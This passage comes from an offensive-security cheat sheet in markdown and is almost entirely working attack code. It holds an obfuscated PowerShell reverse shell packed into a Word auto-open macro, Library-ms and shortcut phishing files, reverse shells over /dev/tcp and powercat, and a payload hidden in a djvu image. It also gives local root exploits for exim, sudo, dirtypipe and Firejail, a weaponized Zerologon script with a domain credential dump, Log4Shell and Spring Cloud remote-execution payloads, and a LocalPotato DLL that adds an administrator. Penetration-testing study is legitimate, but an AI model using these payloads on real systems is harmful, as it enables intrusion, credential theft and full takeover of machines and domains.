$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```
```
str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```
```
$ python3 script.py 
Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
```


## Final Macro

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > winexe > Final Macro`

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
    Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
    Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
    Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
    Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
    Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
    Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
    Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
    Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
    Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
    Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
    Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
    Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
    Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
    Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
    Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
    Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
    Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
    Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
    Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
    Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
    Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
    Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
    Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
    Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```
```
pip3 install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
```


## config.Library-ms

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > winexe > config.Library-ms`

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<LHOST></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Put the `config.Library-ms` file in the `webdav` folder.


## Shortcut File

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > winexe > Shortcut File`

Right-click on Windows to create a new `shortcut file`.

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

Put the `shortcut file (*.lnk)` into the `webdav` folder.


## CVE

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE`

- exim version <= 4.84-3
```
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

> [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)


## Exiftool Exploit

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit`

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/?source=post_page-----229b20b1fd04---------------------------------------

If you don’t have it, install `djvulibre-bin`

```
sudo apt-get install djvulibre-bin
```

Create a script that will be picked up by the exploit using curl: `shell.sh` You can reuse the shell contents from the inital reverse shell. This is the script that will be pulled down by the vulnerable program and passed to bash, so it will initiate the reverse shell as the user running the image-exif.sh script (root).

```
cat shell.sh<br>#!/bin/bash<br><br>bash -i > /dev/tcp/192.168.49.116/8080 0>&1
```

Create the ‘exploit’ - this will be the curl command that is pulling the `shell.sh` just created.

```
cat exploit<br>(metadata "\c${system ('curl http://192.168.49.116:8000/shell.sh \| bash')};")
```

Create exploit.djvu

```
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
```

Change it into a `.jpg` image extension that can be used by the exif cron job. Although, really, it just has to have `jpg` in the name.

```
mv exploit.djvu exploit.jpg
```

Start python server from directory that stores the exploit.jpg

```
python3 -m http.server
```

Open a NetCat listener on Port 8080 (per shell.sh)

```
nc -lnvp 8080
```

From the reverse-shell, curl exploit.jpg into the into uploads folder

```
curl -OJ http://192.168.49.116:8000/exploit.jpg  
```

Wait for the cronjob to run again to pick up the exploited file


https://github.com/joeammond/CVE-2021-4034
CVE-2021-4034 - Sudoi version 1.8.23
```shell
# Download to LHOST and transfer CVE-2021-4034 to RHOST
python CVE-2021-4034.py

# id
root

```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Exploitation`

```
!root:
sudo -u#-1 /bin/bash
```

> [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

> [https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon\_tester.py](https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py)


## Prerequisites

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Prerequisites`

```
python3 -m pip install virtualenv
python3 -m virtualenv venv
source venv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```


## PoC Modification

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > PoC Modification`

```
newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```


## Weaponized PoC

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Weaponized PoC`

```
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')

def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)

if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```


## Execution

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Execution`

```
python3 zerologon_tester.py <HANDLE> <RHOST>
impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
```

> [https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435](https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435)


## Prerequisistes

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Prerequisistes`

- Ubuntu 20.04 (Sudo 1.8.31)
- Debian 10 (Sudo 1.8.27)
- Fedora 33 (Sudo 1.9.2)
- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1


## Vulnerability Test

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Vulnerability Test`

```
sudoedit -s /
```

The machine is vulnerable if one of the following message is shown.

```
sudoedit: /: not a regular file
segfault
```

Not vulnerable if the error message starts with `usage:`.

> [https://github.com/welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)

```
wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
```
```
${jndi:ldap://<LHOST>:1389/ci1dfd}
```


## Alternatively

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Alternatively`

> [https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)


## Prerequisistes

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Alternatively > Prerequisistes`

> [https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)

```
tar -xvf jdk-8u20-linux-x64.tar.gz
```
```
python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>
```


## Execution

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Exiftool Exploit > Alternatively > Execution`

```
${jndi:ldap://<LHOST>:1389/foobar}
```
```
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz:
su rootz
```

> [https://github.com/me2nuk/CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)

```
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
```
```
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
```

> [https://seclists.org/oss-sec/2022/q2/188](https://seclists.org/oss-sec/2022/q2/188)

> [https://www.openwall.com/lists/oss-security/2022/06/08/10](https://www.openwall.com/lists/oss-security/2022/06/08/10)

```
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run \`chmod +x {__file__}\` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```


## First Terminal

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > First Terminal`

```
./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```


## Second Terminal

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Second Terminal`

```
firejail --join=193982
su
```

> [https://github.com/decoder-it/LocalPotato](https://github.com/decoder-it/LocalPotato)

> [https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc)

Modify the following file and build the solution.

```
StorSvc\RpcClient\RpcClient\storsvc_c.c
```
```
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
```

Modify the following file and build the solution.

```
StorSvc\SprintCSP\SprintCSP\main.c
```
```
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.

```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
```

At least trigger `StorSvc` via `RpcClient.exe`.

```
.\RpcClient.exe
```

> [https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466](https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466)


## Prerequisites

